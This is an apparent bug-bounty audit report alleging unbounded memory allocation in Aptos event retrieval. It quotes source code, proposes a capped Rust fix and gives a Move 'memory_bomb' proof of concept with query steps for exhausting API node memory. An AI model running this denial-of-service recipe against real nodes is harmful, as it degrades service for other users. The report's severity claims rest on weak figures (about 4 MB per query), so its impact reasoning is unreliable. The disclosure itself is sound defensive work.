# Audit Report

## Title
Unbounded Memory Allocation in Event Retrieval Causes API Node Memory Exhaustion

## Summary
The `get_events_by_version()` function in the event database loads all events for a transaction version into memory without any limit checks, allowing an attacker to craft transactions with tens of thousands of events that trigger memory exhaustion when queried via the public API.

## Finding Description

The vulnerability exists in the event retrieval logic where transaction events are loaded from storage. [1](#0-0) 

This function allocates an unbounded vector and iterates through all events for a given version without any size limits. An attacker can exploit this by creating transactions that emit the maximum number of events allowed by gas constraints.

**Attack Path:**

1. **Event Creation Phase**: The gas schedule defines byte limits for events, but no count limits. [2](#0-1) 

2. **Gas Analysis**: Event emission costs are minimal. [3](#0-2) 

   With `max_execution_gas` of 920,000,000 internal gas units [4](#0-3)  and base cost of 20,006 per event, an attacker can emit approximately 45,985 events in a single transaction.

3. **Size Validation**: The changeset validation only checks total byte size, not event count. [5](#0-4) 

4. **API Exposure**: The vulnerability is triggered when the transaction is queried. [6](#0-5) 

5. **Memory Allocation**: Each `ContractEvent` object has substantial memory overhead beyond just the event data bytes. [7](#0-6) 

**Exploitation Scenario:**
- Attacker submits a transaction that emits 40,000 minimal events (within gas limits)
- Transaction is committed to the blockchain
- Attacker or any user queries: `GET /transactions/by_version/{version}`
- API node calls `get_events_by_version()` which allocates a vector and loads all 40,000 ContractEvent objects
- With ~100+ bytes per event object, this consumes 4+ MB per query
- Multiple concurrent queries targeting such transactions can exhaust node memory, causing OOM crashes

## Impact Explanation

**Severity: High** - This vulnerability qualifies as High Severity under Aptos bug bounty criteria for the following reasons:

1. **API Crashes**: The unbounded allocation can cause API nodes to run out of memory and crash when serving legitimate user queries
2. **Validator Node Slowdowns**: If validator nodes expose the API endpoint, they can experience memory pressure affecting consensus participation
3. **Denial of Service**: An attacker can force nodes to allocate excessive memory repeatedly by querying malicious transaction versions
4. **No Privileged Access Required**: Any unprivileged user can trigger this vulnerability by querying publicly committed transactions

The impact does not reach Critical severity because it does not directly affect consensus safety, cause fund loss, or create a non-recoverable network partition. However, it significantly degrades service availability.

## Likelihood Explanation

**Likelihood: High** - This vulnerability is highly likely to be exploited:

1. **Low Attack Cost**: Creating the malicious transaction costs only standard gas fees (~2 APT maximum)
2. **Easy Discovery**: The attack vector is straightforward - emit many events and query them
3. **Public Exposure**: The API endpoint is publicly accessible on all full nodes
4. **No Authentication Required**: Anyone can query transaction data via the REST API
5. **Repeatable**: Attacker can create multiple such transactions and continuously query them to sustain the attack

The only limiting factor is that the attacker must first successfully submit and commit the transaction, which requires standard transaction fees.

## Recommendation

Implement a maximum event count limit for the `get_events_by_version()` function. The fix should:

1. **Add Event Count Limit**: Introduce a constant `MAX_EVENTS_PER_VERSION_QUERY` (e.g., 10,000 events)
2. **Early Termination**: Stop iteration and return an error if the limit is exceeded
3. **Graceful Degradation**: Return a descriptive error indicating the transaction has too many events to retrieve in a single call

**Suggested Fix:**

```rust
pub(crate) fn get_events_by_version(&self, version: Version) -> Result<Vec<ContractEvent>> {
    const MAX_EVENTS_PER_VERSION_QUERY: usize = 10_000;
    let mut events = vec![];
    
    let mut iter = self.db.iter::<EventSchema>()?;
    iter.seek(&version)?;
    while let Some(((ver, _index), event)) = iter.next().transpose()? {
        if ver != version {
            break;
        }
        if events.len() >= MAX_EVENTS_PER_VERSION_QUERY {
            return Err(AptosDbError::TooManyRequested(
                events.len() as u64,
                MAX_EVENTS_PER_VERSION_QUERY as u64,
            ));
        }
        events.push(event);
    }
    
    Ok(events)
}
```

**Alternative Approach**: Implement pagination for event retrieval, allowing clients to fetch events in batches with a reasonable page size limit.

## Proof of Concept

**Move Module (Attacker Contract):**

```move
module attacker::memory_bomb {
    use std::signer;
    use aptos_framework::event;
    
    struct TinyEvent has drop, store {
        data: u8,
    }
    
    struct EventHandle has key {
        events: event::EventHandle<TinyEvent>,
    }
    
    public entry fun initialize(account: &signer) {
        move_to(account, EventHandle {
            events: event::new_event_handle<TinyEvent>(account),
        });
    }
    
    public entry fun emit_many_events(account: &signer, count: u64) acquires EventHandle {
        let handle = borrow_global_mut<EventHandle>(signer::address_of(account));
        let i = 0;
        // Emit up to 40,000 events (within gas limits)
        while (i < count) {
            event::emit_event(&mut handle.events, TinyEvent { data: 1 });
            i = i + 1;
        };
    }
}
```

**Attack Steps:**

1. Deploy the `memory_bomb` module
2. Call `initialize()` to create event handle
3. Call `emit_many_events(account, 40000)` with sufficient gas
4. Query the transaction: `curl http://node:8080/v1/transactions/by_version/{version}`
5. Monitor API node memory usage - observe spike of 4+ MB per query
6. Issue multiple concurrent queries to amplify memory pressure
7. API node experiences memory exhaustion and becomes unresponsive

**Expected Behavior:** API node allocates excessive memory for the vector of 40,000 ContractEvent objects, potentially triggering OOM if multiple such queries occur concurrently.

## Notes

While Aptos implements rate limiting at various layers [8](#0-7) , these protections focus on request frequency, not the resource cost per request. A single query for a transaction with 40,000 events will still cause unbounded memory allocation regardless of rate limits.

The vulnerability is compounded by the fact that the transaction remains permanently queryable in the ledger history, allowing sustained exploitation long after the initial transaction submission.

### Citations

**File:** storage/aptosdb/src/ledger_db/event_db.rs (L67-81)
```rust
    pub(crate) fn get_events_by_version(&self, version: Version) -> Result<Vec<ContractEvent>> {
        let mut events = vec![];

        let mut iter = self.db.iter::<EventSchema>()?;
        // Grab the first event and then iterate until we get all events for this version.
        iter.seek(&version)?;
        while let Some(((ver, _index), event)) = iter.next().transpose()? {
            if ver != version {
                break;
            }
            events.push(event);
        }

        Ok(events)
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L163-172)
```rust
        [
            max_bytes_per_event: NumBytes,
            { 5.. => "max_bytes_per_event" },
            1 << 20, // a single event is 1MB max
        ],
        [
            max_bytes_all_events_per_transaction: NumBytes,
            { 5.. => "max_bytes_all_events_per_transaction"},
            10 << 20, // all events from a single transaction are 10MB max
        ],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L211-213)
```rust
            max_execution_gas: InternalGas,
            { 7.. => "max_execution_gas" },
            920_000_000, // 92ms of execution at 10k gas per ms
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs (L323-325)
```rust
        [event_write_to_event_store_base: InternalGas, "event.write_to_event_store.base", 20006],
        // TODO(Gas): the on-chain name is wrong...
        [event_write_to_event_store_per_abstract_value_unit: InternalGasPerAbstractValueUnit, "event.write_to_event_store.per_abstract_memory_unit", 61],
```

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L115-125)
```rust
        let mut total_event_size = 0;
        for event in change_set.events_iter() {
            let size = event.event_data().len() as u64;
            if size > self.max_bytes_per_event {
                return storage_write_limit_reached(None);
            }
            total_event_size += size;
            if total_event_size > self.max_bytes_all_events_per_transaction {
                return storage_write_limit_reached(None);
            }
        }
```

**File:** api/src/context.rs (L992-1002)
```rust
    pub fn get_transaction_by_version(
        &self,
        version: u64,
        ledger_version: u64,
    ) -> Result<TransactionOnChainData> {
        let txn = self.convert_into_transaction_on_chain_data(
            self.db
                .get_transaction_by_version(version, ledger_version, true)?,
        )?;
        Ok(self.maybe_translate_v2_to_v1_events(txn))
    }
```

**File:** types/src/contract_event.rs (L178-190)
```rust
#[derive(Hash, Clone, Eq, PartialEq, Serialize, Deserialize, CryptoHasher)]
#[cfg_attr(any(test, feature = "fuzzing"), derive(Arbitrary))]
pub struct ContractEventV1 {
    /// The unique key that the event was emitted to
    key: EventKey,
    /// The number of messages that have been emitted to the path previously
    sequence_number: u64,
    /// The type of the data
    type_tag: TypeTag,
    /// The data payload of the event
    #[serde(with = "serde_bytes")]
    event_data: Vec<u8>,
}
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_infallible::{Mutex, RwLock};
use aptos_logger::debug;
use aptos_metrics_core::HistogramVec;
use std::{cmp::min, collections::HashMap, fmt::Debug, hash::Hash, sync::Arc, time::Instant};
use tokio::time::Duration;

pub type SharedBucket = Arc<Mutex<Bucket>>;

const ONE_SEC: Duration = Duration::from_secs(1);

/// A generic token bucket filter
///
/// # Terms
/// ## Key
/// A `key` is an identifier of the item being rate limited
///
/// ## Token
/// A `token` is the smallest discrete value that we want to rate limit by.  In a situation involving
/// network requests, this may represent a request or a byte.  `Tokens` are the counters for the
/// rate limiting, and when there are no `tokens` left in a `bucket`, the `key` is throttled.
///
/// ## Bucket
/// A `bucket` is the tracker of the number of `tokens`.  It has a `bucket size`, and any additional
/// tokens added to it will "spill" out of the `bucket`.  The `buckets` are filled at an `interval`
/// with a given `fill rate`.
///
/// ## Interval
/// The `interval` at which we refill *all* of the `buckets` in the token bucket filter. Configured
/// across the whole token bucket filter.
///
/// ## Fill Rate
/// The rate at which we fill a `bucket` with tokens. Configured per bucket.
///
/// ## Bucket Size
/// Maximum size of a bucket.  A bucket saturates at this size.  Configured per bucket.
///
/// # Features
/// ## Keys
/// The token bucket takes any key as long as it's hashable.  This should allow it to apply to
/// many applications that need rate limiters.
///
/// ## Bucket sizes and Rates
/// ### Defaults
/// There are defaults for bucket size and fill rate, which will apply to unknown keys.
///
/// ### Refill Interval
/// Buckets are refilled automatically at an interval.  To do this synchronously, it calculates the
```
